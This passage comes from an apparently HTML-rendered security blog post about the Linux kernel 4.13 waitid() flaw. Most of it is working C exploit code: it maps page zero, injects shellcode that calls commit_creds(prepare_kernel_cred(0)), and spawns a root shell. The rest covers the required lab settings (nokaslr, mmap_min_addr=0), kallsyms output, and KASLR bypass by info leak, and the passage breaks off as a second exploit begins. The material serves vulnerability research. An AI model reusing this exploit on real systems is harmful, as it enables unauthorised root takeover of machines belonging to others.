punctuation\">}</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] failed to get root shell :(\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n  \n<span class=\"token keyword\">void</span> <span class=\"token function\">get_root</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>commit_creds <span class=\"token operator\">&amp;&amp;</span> prepare_kernel_cred<span class=\"token punctuation\">)</span>\n    <span class=\"token function\">commit_creds</span><span class=\"token punctuation\">(</span><span class=\"token function\">prepare_kernel_cred</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n  \n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> <span class=\"token function\">get_kernel_sym</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>name<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  FILE <span class=\"token operator\">*</span>f<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> addr<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">char</span> dummy<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">char</span> sname<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">int</span> ret <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  \n  f <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/kallsyms\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>f <span class=\"token operator\">==</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] Failed to open /proc/kallsyms\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Find %s...\\n\"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span>ret <span class=\"token operator\">!=</span> <span class=\"token constant\">EOF</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    ret <span class=\"token operator\">=</span> <span class=\"token function\">fscanf</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%p %c %s\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>addr<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>dummy<span class=\"token punctuation\">,</span> sname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ret <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">fscanf</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%s\\n\"</span><span class=\"token punctuation\">,</span> sname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">strcmp</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> sname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Found %s at %lx\\n\"</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">return</span> addr<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n  <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n \n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> ac<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>av<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ac <span class=\"token operator\">!=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./exploit kernel_offset\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exemple = 0xffffffff81f3f45a\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> EXIT_FAILURE<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n \n    <span class=\"token comment\">// 2 - Appel de la fonction get_kernel_sym pour rcuperer dans le /proc/kallsyms les adresses des fonctions</span>\n    prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">prepare_kernel_cred_t</span><span class=\"token punctuation\">)</span><span class=\"token function\">get_kernel_sym</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prepare_kernel_cred\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    commit_creds <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">commit_creds_t</span><span class=\"token punctuation\">)</span><span class=\"token function\">get_kernel_sym</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"commit_creds\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// have_canfork_callback offset &lt;= rendre dynamique aussi</span>\n     \n    <span class=\"token class-name\">pid_t</span>     pid<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">/* siginfo_t info; */</span>\n \n    <span class=\"token comment\">// 1 - Mapper la mmoire  l'adresse 0x0000000000000000</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Try to allocat 0x00000000...\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mmap</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">,</span> PROT_READ<span class=\"token operator\">|</span>PROT_WRITE<span class=\"token operator\">|</span>PROT_EXEC<span class=\"token punctuation\">,</span>MAP_ANON<span class=\"token operator\">|</span>MAP_PRIVATE<span class=\"token operator\">|</span>MAP_FIXED<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[-] Failed to allocat 0x00000000\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Allocation success !\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">/* memset(0, 0xcc, 4096); */</span>\n    <span class=\"token comment\">/*\n        movq rax, 0xffffffff81f3f45a\n        movq [rax], 0\n        mov rax, 0x4242424242424242\n        call rax\n        xor rax, rax\n        ret\n        replace 0x4242424242424242 by get_root\n    https://defuse.ca/online-x86-assembler.htm#disassembly\n    */</span>\n    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> shellcode<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> \n    <span class=\"token punctuation\">{</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC3</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>get_root_offset <span class=\"token operator\">=</span> <span class=\"token function\">rawmemchr</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>get_root_offset<span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> get_root<span class=\"token punctuation\">;</span>\n \n    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> shellcode<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">/* strcpy(0, \"\\x48\\x31\\xC0\\xC3\"); // xor rax, rax; ret */</span>\n \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span>pid <span class=\"token operator\">=</span> <span class=\"token function\">fork</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fork()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> EXIT_FAILURE<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n \n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>pid <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xDEADBEEF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">perror</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"son\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> EXIT_FAILURE<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n \n    <span class=\"token class-name\">siginfo_t</span> <span class=\"token operator\">*</span>ptr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">siginfo_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">strtoul</span><span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">waitid</span><span class=\"token punctuation\">(</span>P_PID<span class=\"token punctuation\">,</span> pid<span class=\"token punctuation\">,</span> ptr<span class=\"token punctuation\">,</span> WEXITED <span class=\"token operator\">|</span> WSTOPPED <span class=\"token operator\">|</span> WCONTINUED<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n \n    <span class=\"token comment\">// TRIGGER</span>\n    pid <span class=\"token operator\">=</span> <span class=\"token function\">fork</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"fork_ret = %d\\n\"</span><span class=\"token punctuation\">,</span> pid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pid <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> EXIT_SUCCESS<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>What 'the maker' said about that code, in short.</p>\n<blockquote>\n<p>For exploitation, trigger null dereference.\nOverwrite have_canfork_callback (.bss seg in kernel),\nif have_canfork_callback is set to a value other than 0, unset callback (null) is occurred.\n...</p>\n</blockquote>\n<h2 id=\"but\" style=\"position:relative;\"><a href=\"#but\" aria-label=\"but permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>But...</h2>\n<p>But... Let's talk about <em>my small option</em> <strong>only about</strong> that <em>payload</em>, <strong>Only talk about that payload</strong>, i can say that it's triggered, but... something is missing(?).\nOf course maybe, that payload was made for <strong>trigger purposes only</strong>.</p>\n<p>Because of the testing environments. <em>KASLR</em> is off and <em>mmap min address</em> is 0 for triggering null dereference.</p>\n<blockquote>\n<p>-nokaslr\nsysctl -w vm.mmap_min_addr=0</p>\n</blockquote>\n<h3 id=\"1-kaslr-bypass\" style=\"position:relative;\"><a href=\"#1-kaslr-bypass\" aria-label=\"1 kaslr bypass permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>1. KASLR Bypass</h3>\n<p>Let's talk about it first, <strong>kernel-land ASLR</strong>, <strong>KASLR</strong> is supported from <em>linux kernel 4.4</em>. When we boot with <em>kaslr option</em>, then <em>kaslr</em> will be applied. If not, <em>kaslr</em> is off.\nNormally we just boot the OS, then <em>kaslr</em> is off.</p>\n<p>And another question is below.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">    prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">prepare_kernel_cred_t</span><span class=\"token punctuation\">)</span><span class=\"token function\">get_kernel_sym</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prepare_kernel_cred\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    commit_creds <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">commit_creds_t</span><span class=\"token punctuation\">)</span><span class=\"token function\">get_kernel_sym</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"commit_creds\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>This part from the code is just getting the addresses from <em>/proc/kallsyms</em>.\nBut actually, it does not work as well because if we read the address from <em>/proc/kallsysms</em> without <em>root perm</em> and <em>kaslr</em>, the address would be 0.\nIn summary,</p>\n<ul>\n<li>with <em>nokaslr</em>, <strong>user gets</strong> 0, <strong>root</strong> gets <strong>exact address</strong>.</li>\n<li>with <em>kaslr</em>, can read but all time <strong>random address</strong>. (try it yourself!)</li>\n</ul>\n<p>We can see that below.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">zero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span>$ uname <span class=\"token operator\">-</span>a\nLinux ubuntu <span class=\"token number\">4.13</span><span class=\"token number\">.8</span><span class=\"token operator\">-</span><span class=\"token number\">041308</span><span class=\"token operator\">-</span>generic #<span class=\"token number\">201710180430</span> SMP Wed Oct <span class=\"token number\">18</span> <span class=\"token number\">08</span><span class=\"token operator\">:</span><span class=\"token number\">33</span><span class=\"token operator\">:</span><span class=\"token number\">18</span> UTC <span class=\"token number\">2017</span> x86_64 x86_64 x86_64 GNU<span class=\"token operator\">/</span>Linux\nzero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span>$ id\nuid<span class=\"token operator\">=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">(</span>zero<span class=\"token punctuation\">)</span> gid<span class=\"token operator\">=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">(</span>zero<span class=\"token punctuation\">)</span> groups<span class=\"token operator\">=</span><span class=\"token number\">1000</span><span class=\"token punctuation\">(</span>zero<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">(</span>adm<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">24</span><span class=\"token punctuation\">(</span>cdrom<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">27</span><span class=\"token punctuation\">(</span>sudo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">30</span><span class=\"token punctuation\">(</span>dip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">46</span><span class=\"token punctuation\">(</span>plugdev<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">121</span><span class=\"token punctuation\">(</span>lpadmin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">131</span><span class=\"token punctuation\">(</span>sambashare<span class=\"token punctuation\">)</span>\nzero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span>$ cat <span class=\"token operator\">/</span>proc<span class=\"token operator\">/</span>kallsyms <span class=\"token operator\">|</span> grep prepare_kernel_cred\n<span class=\"token number\">0000000000000000</span> T prepare_kernel_cred\n<span class=\"token number\">0000000000000000</span> r __ksymtab_prepare_kernel_cred\n<span class=\"token number\">0000000000000000</span> r __kstrtab_prepare_kernel_cred\nzero@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">~</span>$ sudo su\n<span class=\"token punctuation\">[</span>sudo<span class=\"token punctuation\">]</span> password <span class=\"token keyword\">for</span> zero<span class=\"token operator\">:</span> \nroot@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>zero# id\nuid<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> gid<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> groups<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span>\nroot@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>zero# cat <span class=\"token operator\">/</span>proc<span class=\"token operator\">/</span>kallsyms <span class=\"token operator\">|</span> grep prepare_kernel_cred\nffffffff8c4a8390 T prepare_kernel_cred\nffffffff8d1ac010 r __ksymtab_prepare_kernel_cred\nffffffff8d1c6526 r __kstrtab_prepare_kernel_cred\nroot@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>zero# cat <span class=\"token operator\">/</span>proc<span class=\"token operator\">/</span>kallsyms <span class=\"token operator\">|</span> grep prepare_kernel_cred\nffffffff8c4a8390 T prepare_kernel_cred\nffffffff8d1ac010 r __ksymtab_prepare_kernel_cred\nffffffff8d1c6526 r __kstrtab_prepare_kernel_cred\nroot@ubuntu<span class=\"token operator\">:</span><span class=\"token operator\">/</span>home<span class=\"token operator\">/</span>zero#</code></pre></div>\n<p><strong>So, user-land with nokaslr, we can't get exact address from /proc/kallsysms with user-perm</strong></p>\n<h3 id=\"2-mmap_min_addr-is-set-to-0\" style=\"position:relative;\"><a href=\"#2-mmap_min_addr-is-set-to-0\" aria-label=\"2 mmap_min_addr is set to 0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>2. mmap_min_addr is set to 0</h3>\n<p>This value is set to <strong>65536</strong> by default for protecting from <em>null dereference</em>.\n(Actually mmap_min_addr is different by platform or OS whatever... ㅇㅅㅇ)</p>\n<blockquote>\n<p>root@ubuntu:/etc/sysctl.d# cat *zeropage.conf <br/>\n... <br/>\nvm.mmap_min_addr = 65536 <br/>\nroot@ubuntu:/etc/sysctl.d#  <br/></p>\n</blockquote>\n<h2 id=\"then\" style=\"position:relative;\"><a href=\"#then\" aria-label=\"then permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Then...?</h2>\n<p><strong>It's not related to this vulnerability</strong>, In the wild, for bypassing mitigation and exploiting fully, it's normal that getting at least one more <em>info leak</em> is essential on any platforms.</p>\n<p>That vulnerability let us give <em>w perm</em> on <em>infop</em> partially, but if there are kaslr and others, then we need to leak <em>kernel base address</em> or sth and other sub-works are needed as well.</p>\n<h2 id=\"conclusion\" style=\"position:relative;\"><a href=\"#conclusion\" aria-label=\"conclusion permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Conclusion</h2>\n<p>It is interesting that this kind of vulnerability in the latest version of Linux Kernel can lead to mistakes yet ;).\nAnyway, it's surprising :).</p>\n<p>In addition 1, <strong>mmap_min_addr</strong> is set to 0, with <strong>nokaslr</strong>, known <em>prepare_kernel_cred</em>, <em>commit_creds</em> addresses already, so there could be several ways to exploit this vulnerability.</p>\n<p>Try it Yourself :)</p>\n<p>In addition 2, on <em>somewhere v4.13.x</em> when <em>kaslr</em> is on, we can bypass <em>kaslr</em> with <strong>info leak</strong> by using waitid().</p>\n<p>Lastly, I just re-make(?) exploit-code with includding kaslr bypass :).\nBut maybe it worked on only <em>4.13.0 &#x3C; x &#x3C;= 4.13.4</em> and just patched somewhere <em>4.13.X or 4.14.0-rcX</em>.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_GNU_SOURCE</span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token 